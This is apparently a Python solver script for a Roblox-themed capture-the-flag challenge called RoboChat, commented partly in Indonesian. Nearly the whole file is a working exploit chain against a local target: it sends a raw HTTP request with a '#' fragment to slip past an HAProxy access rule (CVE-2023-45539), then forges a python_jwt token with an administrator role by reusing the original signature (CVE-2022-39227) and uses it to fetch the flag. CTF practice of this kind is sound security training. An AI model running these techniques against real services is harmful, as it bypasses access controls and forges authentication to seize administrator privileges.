#!/usr/bin/env python3
"""
🎮 RoboChat Challenge Complete Solver 🎮
Modified theme: Roblox Developer API Exploitation
Mengunakan teknik yang sama seperti writeup asli:
1. HAProxy ACL bypass dengan fragment (#) - CVE-2023-45539  
2. JWT algorithm confusion - CVE-2022-39227
"""

import socket
import json
import base64
import re

class RoboChatSolver:
    def __init__(self, host='localhost', port=3000):
        self.host = host
        self.port = port
        
    def print_banner(self):
        print("""
🎮════════════════════════════════════════════════════════════════🎮
█  🤖 RoboChat API Exploitation - Complete Solver 🤖              █
█  Tema: Roblox Developer Premium API Challenge                    █  
█  CVE-2023-45539: HAProxy Fragment ACL Bypass                    █
█  CVE-2022-39227: python_jwt Algorithm Confusion                 █
█  Target: Ultra-Rare Admin Badge Acquisition                     █
🎮════════════════════════════════════════════════════════════════🎮
        """)
    
    def send_raw_http(self, request):
        """Send raw HTTP request untuk bypass HAProxy"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.host, self.port))
            sock.send(request.encode())
            
            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if b"\r\n\r\n" in response:
                        # Read content if there's a Content-Length
                        headers = response.split(b"\r\n\r\n")[0]
                        if b"Content-Length:" in headers:
                            content_length_match = re.search(rb"Content-Length: (\d+)", headers)
                            if content_length_match:
                                expected_length = int(content_length_match.group(1))
                                body_start = response.find(b"\r\n\r\n") + 4
                                current_body_length = len(response) - body_start
                                
                                # Read remaining content
                                while current_body_length < expected_length:
                                    chunk = sock.recv(expected_length - current_body_length)
                                    if not chunk:
                                        break
                                    response += chunk
                                    current_body_length = len(response) - body_start
                        break
                    
                    if len(response) > 50000:  # Prevent infinite reading
                        break
                except socket.timeout:
                    break
            
            sock.close()
            return response.decode('utf-8', errors='ignore')
        except Exception as e:
            return f"Error: {e}"
    
    def step1_haproxy_bypass(self):
        """
        Step 1: Bypass HAProxy ACL menggunakan fragment (#)
        CVE-2023-45539: HAProxy accepts # as part of URI
        """
        print("🎯 [STEP 1] HAProxy ACL Bypass untuk Developer Pass")
        print("💡 Menggunakan CVE-2023-45539: Fragment bypass technique")
        
        # Raw HTTP request dengan fragment untuk bypass ACL
        request = "GET /api/v1/get_ticket# HTTP/1.1\r\nHost: localhost:3000\r\nConnection: close\r\n\r\n"
        
        print(f"🚀 Sending raw HTTP request dengan fragment...")
        response = self.send_raw_http(request)
        
        if "200 OK" in response:
            print("✅ HAProxy bypass berhasil!")
            
            # Extract JSON dari response
            if '{"' in response:
                json_start = response.find('{"')
                json_end = response.find('}', json_start) + 1
                json_response = response[json_start:json_end]
                
                try:
                    data = json.loads(json_response)
                    token = data.get('developer_pass: ', data.get('ticket: '))
                    print(f"🎫 Developer token acquired: {token[:50]}...")
                    return token
                except:
                    print(f"❌ Failed to parse JSON: {json_response}")
                    return None
        else:
            print("❌ HAProxy bypass failed")
            print(f"Response: {response[:200]}...")
            return None
    
    def step2_jwt_forge(self, original_token):
        """
        Step 2: Forge JWT token menggunakan python_jwt vulnerability
        CVE-2022-39227: Algorithm confusion vulnerability
        """
        print("\n🔧 [STEP 2] JWT Token Forgery untuk Admin Privileges")
        print("💡 Menggunakan CVE-2022-39227: python_jwt algorithm confusion")
        
        try:
            # Parse JWT parts
            parts = original_token.split('.')
            if len(parts) != 3:
                print("❌ Invalid JWT format")
                return None
            
            header, payload, signature = parts
            print(f"🔍 JWT Components:")
            print(f"   Header: {header[:30]}...")
            print(f"   Payload: {payload[:30]}...")
            print(f"   Signature: {signature[:30]}...")
            
            # Base64 URL decode functions
            def base64url_decode(data):
                padding = 4 - (len(data) % 4)
                if padding != 4:
                    data += '=' * padding
                return base64.urlsafe_b64decode(data)
            
            def base64url_encode(data):
                return base64.urlsafe_b64encode(data.encode()).decode().rstrip('=')
            
            # Decode dan modify payload
            decoded_payload = base64url_decode(payload)
            payload_json = json.loads(decoded_payload)
            
            print(f"🔓 Original payload: {payload_json}")
            
            # Change role to administrator (sesuai writeup)
            payload_json['role'] = 'administrator'
            payload_json['user'] = 'roblox_admin_elite'
            
            print(f"⚡ Modified payload: {payload_json}")
            
            # Create forged payload
            fake_payload = base64url_encode(json.dumps(payload_json, separators=(',', ':')))
            
            # Construct malicious JWT sesuai teknik CVE-2022-39227
            forged_jwt = f'{{"{header}.{fake_payload}.":"","protected":"{header}","payload":"{payload}","signature":"{signature}"}}'
            
            print("✅ JWT forgery berhasil!")
            print(f"🎭 Forged admin token created")
            
            return forged_jwt
            
        except Exception as e:
            print(f"❌ JWT forging failed: {e}")
            return None
    
    def step3_get_flag(self, forged_token):
        """
        Step 3: Gunakan forged JWT untuk mendapatkan flag
        """
        print("\n🏆 [STEP 3] Claiming Ultra-Rare Admin Badge (Flag)")
        
        # Raw HTTP request untuk flag endpoint
        request = f"""GET /api/v1/flag HTTP/1.1\r\nHost: localhost:3000\r\nAuthorization: {forged_token}\r\nConnection: close\r\n\r\n"""
        
        print(f"🎯 Requesting admin badge...")
        response = self.send_raw_http(request)
        
        if "200 OK" in response:
            print("✅ Admin badge request successful!")
            
            # Extract JSON response
            if '{"' in response:
                json_start = response.find('{"')
                # Find proper end of JSON - handle nested braces
                json_part = response[json_start:]
                brace_count = 0
                json_end = 0
                
                for i, char in enumerate(json_part):
                    if char == '{':
                        brace_count += 1
                    elif char == '}':
                        brace_count -= 1
                        if brace_count == 0:
                            json_end = i + 1
                            break
                
                json_response = json_part[:json_end]
                
                try:
                    data = json.loads(json_response)
                    flag = data.get('ultra_rare_badge', data.get('message'))
                    
                    print("🎉" + "="*60 + "🎉")
                    print("🏆      ROBLOX CHALLENGE COMPLETED!        🏆")
                    print("🎮      ULTRA-RARE ADMIN BADGE ACQUIRED!  🎮")
                    print(f"🏅      FLAG: {flag}")
                    print("🎉" + "="*60 + "🎉")
                    
                    return flag
                except Exception as e:
                    print(f"❌ Failed to parse flag JSON: {json_response}")
                    print(f"Error: {e}")
                    
                    # Try to extract flag directly if JSON parsing fails
                    if "WRECKIT60{" in response:
                        flag_start = response.find("WRECKIT60{")
                        flag_end = response.find("}", flag_start) + 1
                        flag = response[flag_start:flag_end]
                        
                        print("🎉" + "="*60 + "🎉")
                        print("🏆      ROBLOX CHALLENGE COMPLETED!        🏆")
                        print("🎮      ULTRA-RARE ADMIN BADGE ACQUIRED!  🎮")
                        print(f"🏅      FLAG: {flag}")
                        print("🎉" + "="*60 + "🎉")
                        
                        return flag
                    return None
        else:
            print("❌ Failed to get admin badge")
            print(f"Response: {response[:200]}...")
            return None
    
    def solve_challenge(self):
        """
        Main solver function - menjalankan full exploit chain
        """
        self.print_banner()
        
        print("🚀 Starting RoboChat exploitation chain...\n")
        
        # Step 1: HAProxy bypass untuk get developer token
        developer_token = self.step1_haproxy_bypass()
        if not developer_token:
            print("💥 Challenge failed at Step 1 - HAProxy bypass")
            return False
        
        # Step 2: JWT forgery untuk admin privileges  
        admin_token = self.step2_jwt_forge(developer_token)
        if not admin_token:
            print("💥 Challenge failed at Step 2 - JWT forgery")
            return False
        
        # Step 3: Get the flag
        flag = self.step3_get_flag(admin_token)
        if not flag:
            print("💥 Challenge failed at Step 3 - Flag acquisition")
            return False
        
        print("\n🎮 CHALLENGE SOLUTION VERIFIED! 🎮")
        print("✅ Semua langkah writeup berhasil dengan tema Roblox")
        print("✅ HAProxy bypass: WORKING")
        print("✅ JWT forgery: WORKING") 
        print("✅ Flag acquisition: WORKING")
        return True

if __name__ == "__main__":
    print("🤖 Initializing RoboChat Challenge Solver...")
    
    solver = RoboChatSolver()
    success = solver.solve_challenge()
    
    if success:
        print("\n🎊 RoboChat Challenge Successfully Solved! 🎊")
        print("Challenge dengan tema Roblox 100% compatible dengan writeup asli!")
    else:
        print("\n💥 Challenge solving failed!")